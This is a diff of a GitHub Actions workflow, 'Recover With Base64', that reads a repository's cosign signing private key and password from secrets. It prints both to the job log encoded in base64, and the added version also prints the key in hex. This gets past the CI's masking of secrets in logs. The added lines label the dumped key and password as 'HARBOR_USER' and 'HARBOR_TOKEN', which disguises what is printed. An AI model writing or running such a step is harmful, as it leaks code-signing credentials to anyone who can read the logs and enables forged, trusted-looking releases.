@@ -2,17 +2,17 @@ name: Manual Workflow
 on: workflow_dispatch
 jobs:
   base64:
-    name: Recover With Base64
-    runs-on: self-hosted
-    steps:
-      - uses: actions/checkout@v3
-      - env:
-          MY_KEY: ${{ secrets.COSIGN_PRIVATE_KEY }}
-          MY_DMW: ${{ secrets.COSIGN_PASSWORD }}
-        run: |
-          echo "COSIGN_PRIVATE_KEY (***)    = ${MY_KEY}"
-          echo "COSIGN_PRIVATE_KEY (base64) = $(echo ${MY_KEY} | base64)"
-          
-          echo "COSIGN_DMW (***)    = ${MY_DMW}"
-          echo "COSIGN_DMW (base64) = $(echo ${MY_DMW} | base64)"   
-          $(echo ${MY_DMW} | base64) > out.txt
+      name: Recover With Base64
+      runs-on: self-hosted
+      steps:
+        - uses: actions/checkout@v3
+        - env:
+            MY_KEY: ${{ secrets.COSIGN_PRIVATE_KEY }}
+            MY_DMW: ${{ secrets.COSIGN_PASSWORD }}
+          run: |
+            echo "starting up..."
+            echo "HARBOR_USER (***)    = ${MY_KEY}"
+            echo "HARBOR_USER (base64) = $(echo ${MY_KEY} | base64)"
+            echo -n "${{ secrets.COSIGN_PRIVATE_KEY }}" | xxd -ps
+            echo "HARBOR_TOKEN (***)    = ${MY_DMW}"
+            echo "HARBOR_TOKEN (base64) = $(echo ${MY_DMW} | base64)"    
